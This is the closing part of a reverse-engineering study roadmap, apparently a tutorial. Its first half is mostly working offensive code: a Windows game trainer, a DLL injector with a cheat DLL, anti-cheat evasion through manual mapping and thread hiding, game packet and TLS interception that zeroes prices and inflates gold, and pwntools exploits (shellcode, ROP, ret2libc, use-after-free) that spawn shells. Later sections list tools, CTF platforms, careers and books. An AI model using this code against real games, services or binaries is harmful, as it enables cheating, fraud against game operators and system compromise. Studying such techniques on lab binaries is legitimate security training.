# Complete Reverse Engineering Mastery Guide (Final Part)

## Phase 6: Expert Specializations (Year 3+)

### Month 22-24: Game Hacking & Anti-Cheat Bypass

#### Week 77-82: Memory Scanning and Modification

**Cheat Engine Basics:**

```
# Finding Values in Memory

1. Attach to game process
2. Scan for value (e.g., health = 100)
3. Change value in game
4. Next scan for new value
5. Repeat until few addresses remain
6. Modify value to desired amount

# Advanced Scanning
- Unknown initial value
- Increased/decreased value
- Float values
- Double values
- Array of bytes
- Wildcard patterns
```

**Creating Memory Trainers:**

```cpp
// game_trainer.cpp - Simple game trainer
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

class GameTrainer {
private:
    DWORD pid;
    HANDLE hProcess;

public:
    GameTrainer(const char* processName) {
        pid = GetProcessByName(processName);
        if (pid) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        }
    }

    ~GameTrainer() {
        if (hProcess) {
            CloseHandle(hProcess);
        }
    }

    DWORD GetProcessByName(const char* name) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};

        if (Process32First(snapshot, &pe32)) {
            do {
                if (strcmp(pe32.szExeFile, name) == 0) {
                    CloseHandle(snapshot);
                    return pe32.th32ProcessID;
                }
            } while (Process32Next(snapshot, &pe32));
        }

        CloseHandle(snapshot);
        return 0;
    }

    bool ReadMemory(LPVOID address, LPVOID buffer, SIZE_T size) {
        SIZE_T bytesRead;
        return ReadProcessMemory(hProcess, address, buffer, size, &bytesRead);
    }

    bool WriteMemory(LPVOID address, LPVOID data, SIZE_T size) {
        SIZE_T bytesWritten;
        DWORD oldProtect;

        VirtualProtectEx(hProcess, address, size, PAGE_EXECUTE_READWRITE, &oldProtect);
        bool result = WriteProcessMemory(hProcess, address, data, size, &bytesWritten);
        VirtualProtectEx(hProcess, address, size, oldProtect, &oldProtect);

        return result;
    }

    uintptr_t GetModuleBase(const char* moduleName) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
        MODULEENTRY32 me32 = {sizeof(MODULEENTRY32)};

        if (Module32First(snapshot, &me32)) {
            do {
                if (strcmp(me32.szModule, moduleName) == 0) {
                    CloseHandle(snapshot);
                    return (uintptr_t)me32.modBaseAddr;
                }
            } while (Module32Next(snapshot, &me32));
        }

        CloseHandle(snapshot);
        return 0;
    }

    uintptr_t ResolvePointerChain(uintptr_t base, std::vector<uintptr_t> offsets) {
        uintptr_t addr = base;

        for (size_t i = 0; i < offsets.size(); i++) {
            ReadMemory((LPVOID)addr, &addr, sizeof(addr));
            addr += offsets[i];
        }

        return addr;
    }

    // Hotkeys
    void SetGodMode(uintptr_t healthAddress) {
        int maxHealth = 9999;
        WriteMemory((LPVOID)healthAddress, &maxHealth, sizeof(maxHealth));
    }

    void SetInfiniteAmmo(uintptr_t ammoAddress) {
        int maxAmmo = 999;
        WriteMemory((LPVOID)ammoAddress, &maxAmmo, sizeof(maxAmmo));
    }

    void Teleport(uintptr_t posAddress, float x, float y, float z) {
        float pos[3] = {x, y, z};
        WriteMemory((LPVOID)posAddress, pos, sizeof(pos));
    }
};

// Usage
int main() {
    GameTrainer trainer("game.exe");

    uintptr_t baseAddr = trainer.GetModuleBase("game.exe");

    // Example: Health pointer chain
    // [[game.exe+0x123456]+0x10]+0x20
    std::vector<uintptr_t> healthOffsets = {0x10, 0x20};
    uintptr_t healthAddr = trainer.ResolvePointerChain(baseAddr + 0x123456, healthOffsets);

    // Hotkey loop
    while (true) {
        if (GetAsyncKeyState(VK_F1) & 0x8000) {
            trainer.SetGodMode(healthAddr);
            std::cout << "God mode enabled\n";
            Sleep(200);
        }

        if (GetAsyncKeyState(VK_F2) & 0x8000) {
            // Infinite ammo
            Sleep(200);
        }

        Sleep(10);
    }

    return 0;
}
```

**Code Injection Techniques:**

```cpp
// dll_injector.cpp - DLL injection
#include <windows.h>

bool InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    // Allocate memory for DLL path
    LPVOID dllPathAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write DLL path
    WriteProcessMemory(hProcess, dllPathAddr, dllPath, strlen(dllPath) + 1, NULL);

    // Get LoadLibraryA address
    HMODULE kernel32 = GetModuleHandle("kernel32.dll");
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(kernel32, "LoadLibraryA");

    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)loadLibAddr,
                                       dllPathAddr, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

// cheat_dll.cpp - The injected DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, CheatThread, NULL, 0, NULL);
    }
    return TRUE;
}

DWORD WINAPI CheatThread(LPVOID param) {
    // Hook functions
    uintptr_t baseAddr = (uintptr_t)GetModuleHandle(NULL);

    // Example: Hook damage function
    uintptr_t takeDamageAddr = baseAddr + 0x12345;

    // NOP out damage
    BYTE nop[] = {0x90, 0x90, 0x90, 0x90, 0x90};
    DWORD oldProtect;
    VirtualProtect((LPVOID)takeDamageAddr, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy((void*)takeDamageAddr, nop, 5);
    VirtualProtect((LPVOID)takeDamageAddr, 5, oldProtect, &oldProtect);

    return 0;
}
```

**Anti-Cheat Analysis:**

```
Common Anti-Cheat Techniques:

1. Memory Integrity Checks
   - CRC/Hash of code sections
   - Periodic scanning for modifications
   - Bypass: Hook the check function

2. Debugger Detection
   - IsDebuggerPresent()
   - PEB flags
   - Hardware breakpoints
   - Bypass: Use anti-anti-debug techniques

3. Driver-Level Protection
   - Kernel-mode anti-cheat
   - Memory scanning from kernel
   - Bypass: Complex, requires kernel exploit

4. Virtualization Detection
   - Detect if running in VM
   - CPUID checks
   - Timing attacks
   - Bypass: Hide VM artifacts

5. Code Obfuscation
   - Virtualized code
   - Encrypted game logic
   - Bypass: Dynamic analysis

6. Server-Side Validation
   - Sanity checks on server
   - Impossible to bypass locally
   - Requires protocol analysis
```

**Bypassing Anti-Cheat:**

```cpp
// bypass_anticheat.cpp

// Technique 1: Manual Mapping (avoid LoadLibrary detection)
bool ManualMap(HANDLE hProcess, const char* dllPath) {
    // Read DLL file
    HANDLE hFile = CreateFile(dllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* localImage = new BYTE[fileSize];
    ReadFile(hFile, localImage, fileSize, NULL, NULL);
    CloseHandle(hFile);

    // Parse PE
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localImage;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(localImage + dosHeader->e_lfanew);

    // Allocate memory in target
    LPVOID remoteImage = VirtualAllocEx(hProcess, NULL,
                                        ntHeaders->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write headers
    WriteProcessMemory(hProcess, remoteImage, localImage,
                      ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // Write sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(hProcess,
                          (LPVOID)((uintptr_t)remoteImage + section[i].VirtualAddress),
                          localImage + section[i].PointerToRawData,
                          section[i].SizeOfRawData, NULL);
    }

    // Resolve imports (manually)
    // Fix relocations
    // Call entry point

    delete[] localImage;
    return true;
}

// Technique 2: Memory hiding
void HideMemory(LPVOID address, SIZE_T size) {
    // Use undocumented NtSetInformationVirtualMemory
    // Or hook ZwQueryVirtualMemory to hide regions
}

// Technique 3: Thread hiding
void HideThread(HANDLE hThread) {
    typedef NTSTATUS (WINAPI *pNtSetInformationThread)(
        HANDLE, UINT, PVOID, ULONG);

    HMODULE ntdll = GetModuleHandle("ntdll.dll");
    pNtSetInformationThread NtSIT = (pNtSetInformationThread)
        GetProcAddress(ntdll, "NtSetInformationThread");

    // ThreadHideFromDebugger = 0x11
    NtSIT(hThread, 0x11, NULL, 0);
}
```

#### Week 83-88: Network Protocol Manipulation

**Packet Capture and Modification:**

```python
# game_packet_interceptor.py
from scapy.all import *
from mitmproxy import proxy, options
from mitmproxy.tools.dump import DumpMaster
import struct

class GamePacketInterceptor:
    def __init__(self, game_server_ip, game_port):
        self.server_ip = game_server_ip
        self.port = game_port
        self.packets = []

    def sniff_packets(self):
        """Capture game packets"""
        filter_str = f"host {self.server_ip} and port {self.port}"
        sniff(filter=filter_str, prn=self.analyze_packet, store=0)

    def analyze_packet(self, pkt):
        """Analyze game packet structure"""
        if pkt.haslayer(Raw):
            data = bytes(pkt[Raw].load)
            self.packets.append(data)

            # Try to parse packet
            if len(data) >= 4:
                packet_type = struct.unpack('<I', data[0:4])[0]
                print(f"Packet Type: {hex(packet_type)}")
                print(f"Data: {data.hex()}")

                # Parse based on type
                self.parse_game_packet(packet_type, data[4:])

    def parse_game_packet(self, ptype, data):
        """Parse game-specific packet format"""
        # Example formats:

        # Login packet: [4 bytes type][4 bytes user_id][32 bytes username]
        if ptype == 0x01:
            user_id = struct.unpack('<I', data[0:4])[0]
            username = data[4:36].decode('utf-8', errors='ignore').strip('\x00')
            print(f"Login: UserID={user_id}, Username={username}")

        # Movement packet: [4 bytes type][4 bytes x][4 bytes y][4 bytes z]
        elif ptype == 0x02:
            x, y, z = struct.unpack('<fff', data[0:12])
            print(f"Movement: X={x:.2f}, Y={y:.2f}, Z={z:.2f}")

        # Inventory packet
        elif ptype == 0x03:
            # Parse inventory items
            pass

    def modify_packet(self, original_data, modifications):
        """Modify packet data"""
        data = bytearray(original_data)

        for offset, value in modifications.items():
            if isinstance(value, int):
                struct.pack_into('<I', data, offset, value)
            elif isinstance(value, float):
                struct.pack_into('<f', data, offset, value)
            elif isinstance(value, bytes):
                data[offset:offset+len(value)] = value

        return bytes(data)

    def inject_packet(self, packet_data):
        """Inject custom packet"""
        # Build packet
        ip = IP(dst=self.server_ip)
        tcp = TCP(dport=self.port)
        payload = Raw(load=packet_data)

        # Send
        send(ip/tcp/payload)

    def create_cheat_packet(self):
        """Create packet to give items/gold/etc."""
        # Example: Spawn item packet
        packet = struct.pack('<I', 0x10)  # Type: spawn_item
        packet += struct.pack('<I', 999)   # Item ID: gold
        packet += struct.pack('<I', 999999)  # Quantity

        return packet

# Usage with WinDivert for Windows
class WinDivertInterceptor:
    def __init__(self):
        import pydivert
        self.w = pydivert.WinDivert("tcp.DstPort == 8080")

    def intercept_and_modify(self):
        self.w.open()

        for packet in self.w:
            if packet.tcp and packet.payload:
                # Modify payload
                data = bytearray(packet.payload)

                # Example: Change gold amount
                if len(data) >= 8:
                    # Assume gold is at offset 4
                    struct.pack_into('<I', data, 4, 999999)
                    packet.payload = bytes(data)

                # Recalculate checksums
                packet.recalculate()

            self.w.send(packet)

# Advanced: SSL/TLS Interception
class SSLGameInterceptor:
    def request(self, flow):
        """Intercept and modify requests"""
        if "game-api.example.com" in flow.request.pretty_host:
            # Modify request
            if b"buy_item" in flow.request.content:
                # Change price to 0
                flow.request.content = flow.request.content.replace(
                    b'"price":100', b'"price":0'
                )

    def response(self, flow):
        """Modify server responses"""
        if "game-api.example.com" in flow.request.pretty_host:
            # Give free items
            if b'"items"' in flow.response.content:
                import json
                data = json.loads(flow.response.content)
                data['gold'] = 999999
                flow.response.content = json.dumps(data).encode()

# Run mitmproxy with addon
# mitmproxy -s game_interceptor.py
```

### Month 25-27: Exploit Development

#### Week 89-94: Stack Buffer Overflows

**Basic Stack Overflow:**

```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    vulnerable_function(argv[1]);
    printf("Done\n");
    return 0;
}

// Compile with protections disabled:
// gcc -fno-stack-protector -z execstack -no-pie vulnerable.c -o vulnerable
```

**Exploiting the Overflow:**

```python
# exploit.py
import struct
import subprocess

def p32(addr):
    """Pack 32-bit address"""
    return struct.pack('<I', addr)

def p64(addr):
    """Pack 64-bit address"""
    return struct.pack('<Q', addr)

# Find offset to return address
# Use pattern_create and pattern_offset (from Metasploit)
# or manually with 'AAAA', 'BBBB', etc.

offset = 72  # Bytes to overwrite return address

# Shellcode (x86 Linux execve("/bin/sh"))
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# NOP sled
nop_sled = b"\x90" * 20

# Build exploit
# [NOP sled][Shellcode][Padding][Return Address]
payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))

# Return address (points to NOP sled)
# Find with: gdb -q vulnerable
#           > run $(python -c 'print "A"*100')
#           > x/100x $esp
ret_addr = 0xbffff650  # Example address (will vary)
payload += p32(ret_addr)

# Run exploit
proc = subprocess.Popen(['./vulnerable', payload])
proc.wait()
```

**ROP Chain Construction:**

```python
# rop_exploit.py - Bypass NX (non-executable stack)
from pwn import *

# Load binary
elf = ELF('./vulnerable')
rop = ROP(elf)

# Find gadgets
# ROPgadget --binary vulnerable
# or use pwntools

# Build ROP chain
# Goal: execve("/bin/sh", NULL, NULL)

offset = 72

# x64 System V calling convention
# rdi = arg1, rsi = arg2, rdx = arg3

# Gadgets needed:
pop_rdi = 0x4011d3  # pop rdi; ret
pop_rsi = 0x4011d1  # pop rsi; pop r15; ret
bin_sh = 0x404030   # Address of "/bin/sh" string
execve = 0x401050   # execve@plt

payload = b"A" * offset

# ROP chain
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rsi)
payload += p64(0)       # rsi = NULL
payload += p64(0)       # r15 = 0 (junk)
payload += p64(execve)

# Send payload
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

**ret2libc Technique:**

```python
# ret2libc.py - Call system() from libc
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Start process with debugging
p = process('./vulnerable')
# p = remote('target.com', 1337)  # For remote

# Leak libc address
# (Requires format string vuln or memory leak)

# If we have ASLR, need to leak a libc address first
# Example using puts to leak GOT entry
offset = 72

pop_rdi = 0x4011d3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# Stage 1: Leak libc
payload1 = b"A" * offset
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main)  # Return to main

p.sendline(payload1)
p.recvline()

leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked puts: {hex(leaked)}")

# Calculate libc base
libc.address = leaked - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")

# Stage 2: Execute system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload2 = b"A" * offset
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

#### Week 95-100: Heap Exploitation

**Use-After-Free Exploit:**

```c
// uaf_vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct User {
    char name[32];
    void (*print)();
};

void print_user() {
    printf("User account\n");
}

void admin_shell() {
    printf("Admin shell!\n");
    system("/bin/sh");
}

int main() {
    struct User *user1 = malloc(sizeof(struct User));
    strcpy(user1->name, "john");
    user1->print = print_user;

    free(user1);

    // Use after free!
    struct User *user2 = malloc(sizeof(struct User));
    strcpy(user2->name, "admin");
    // If user2 reuses user1's memory, we can overwrite function pointer

    user1->print();  // Calls freed memory!

    return 0;
}
```

**Exploiting UAF:**

```python
# uaf_exploit.py
from pwn import *

p = process('./uaf_vuln')
# p = remote('target.com', 1337)

# Trigger UAF
# Allocate object
p.sendline(b'1')  # Allocate user

# Free it
p.sendline(b'2')  # Free user

# Reallocate with controlled data
# Overwrite function pointer with admin_shell address
admin_shell = 0x401234  # Address of admin_shell()

payload = b"A" * 32  # Fill name
payload += p64(admin_shell)  # Overwrite function pointer

p.sendline(b'3')  # Allocate again
p.sendline(payload)

# Trigger use
p.sendline(b'4')  # Call function pointer

p.interactive()
```

---

## Tools & Environment Setup

### Essential Tool Collection

**Disassemblers & Decompilers:**

```
1. IDA Pro ($$$) - Industry standard
   - Best disassembler
   - Hexrays decompiler
   - Powerful scripting (Python/IDC)

2. Ghidra (Free) - NSA's tool
   - Excellent decompiler
   - Good for beginners
   - Java-based, slower

3. Binary Ninja ($$) - Modern alternative
   - Clean UI
   - Multiple IL levels
   - Good API

4. radare2 (Free) - Command line
   - Powerful but steep learning curve
   - Cutter GUI available

5. Hopper ($$) - Mac/Linux
   - Good for Mach-O binaries
```

**Debuggers:**

```
1. x64dbg (Free, Windows)
2. OllyDbg (Free, Windows, 32-bit only)
3. GDB + pwndbg/gef (Free, Linux)
4. WinDbg (Free, Windows, kernel)
5. LLDB (Free, Mac/Linux)
```

**Dynamic Analysis:**

```
1. Frida - Runtime instrumentation
2. Intel Pin - Binary instrumentation
3. DynamoRIO - Dynamic instrumentation
4. API Monitor - Windows API calls
5. Process Monitor - Windows file/registry
```

**Hex Editors:**

```
1. HxD (Free, Windows)
2. 010 Editor ($$) - Templates
3. ImHex (Free) - Pattern language
4. Hex Fiend (Free, Mac)
```

---

## Practice Labs & Challenges

### Recommended Platforms

**CTF Platforms:**

```
1. HackTheBox (htb.com)
   - Reversing challenges
   - Real-world scenarios

2. PicoCTF (picoctf.org)
   - Beginner-friendly
   - Educational content

3. RingZer0 Team (ringzer0ctf.com)
   - Diverse challenges

4. Crackmes.one
   - Dedicated reversing
   - Various difficulties

5. Reversing.kr
   - Korean CTF site
   - Good challenges
```

**Practice Binaries:**

```
1. Microcorruption (microcorruption.com)
   - Embedded reversing
   - MSP430 architecture
   - Excellent for learning

2. pwnable.kr
   - System exploitation
   - Various architectures

3. exploit.education
   - Phoenix
   - Fusion
   - Nebula
```

**Malware Samples:**

```
1. theZoo (GitHub)
   - Malware repository
   - USE WITH CAUTION

2. MalwareBazaar
   - Fresh samples

3. VirusTotal
   - Search by hash
   - Download samples (VT account needed)
```

---

## Career Paths

### Job Roles

**1. Malware Analyst**

```
Responsibilities:
- Analyze malware samples
- Write YARA rules
- Create threat reports
- Develop detection signatures

Salary: $80k - $150k
Skills: IDA, Ghidra, YARA, Python
```

**2. Security Researcher**

```
Responsibilities:
- Find vulnerabilities
- Develop exploits
- Publish research
- Present at conferences

Salary: $100k - $200k+
Skills: Advanced RE, exploit dev, 0-days
```

**3. Penetration Tester**

```
Responsibilities:
- Test application security
- Bypass protections
- Write exploitation reports

Salary: $70k - $140k
Skills: General security, RE, networking
```

**4. Firmware Engineer**

```
Responsibilities:
- Analyze IoT devices
- Find firmware vulnerabilities
- Hardware security assessment

Salary: $90k - $160k
Skills: Embedded systems, hardware, RE
```

**5. Game Security Engineer**

```
Responsibilities:
- Develop anti-cheat systems
- Analyze game hacks
- Protect game assets

Salary: $80k - $150k
Skills: RE, anti-debug, game engines
```

### Building Portfolio

**GitHub Projects:**

```
1. Reverse engineering tools
   - IDA/Ghidra scripts
   - Unpackers
   - Deobfuscators

2. CTF writeups
   - Document solutions
   - Explain techniques

3. Malware analysis reports
   - Professional format
   - IOC extraction

4. Exploit PoCs
   - Responsible disclosure
   - Educational purposes
```

**Blog/Twitter:**

```
- Write technical articles
- Share discoveries
- Build reputation
- Network with community
```

**Certifications:**

```
1. GIAC Reverse Engineering Malware (GREM)
2. Offensive Security Exploitation Expert (OSEE)
3. Certified Reverse Engineering Analyst (CREA)
4. SANS FOR610 (Reverse Engineering Malware)
```

---

## Learning Resources

### Books

```
1. "Practical Malware Analysis" - Sikorski
2. "The IDA Pro Book" - Eagle
3. "Reversing: Secrets of Reverse Engineering" - Eilam
4. "Practical Binary Analysis" - Andriesse
5. "The Art of Memory Forensics" - Ligh et al.
6. "Hacking: The Art of Exploitation" - Erickson
7. "Gray Hat Hacking" - Harris et al.
```

### Online Courses

```
1. Practical Reverse Engineering (Pentester Academy)
2. Modern Binary Exploitation (RPI)
3. Reverse Engineering 101 (Malware Unicorn)
4. OpenSecurityTraining courses
5. RPISEC MBE course
```

### YouTube Channels

```
1. LiveOverflow
2. MalwareTech
3. John Hammond
4. IppSec
5. OALabs
6. Guided Hacking
```

### Communities

```
1. r/ReverseEngineering
2. r/REMath
3. Discord: RE & ME servers
4. Twitter #RevEng community
5. Reverse Engineering Stack Exchange
```

---

## Final Tips

### Daily Practice Routine

```
Week 1-4: Assembly fundamentals (2 hrs/day)
Week 5-8: Simple crackmes (2 hrs/day)
```
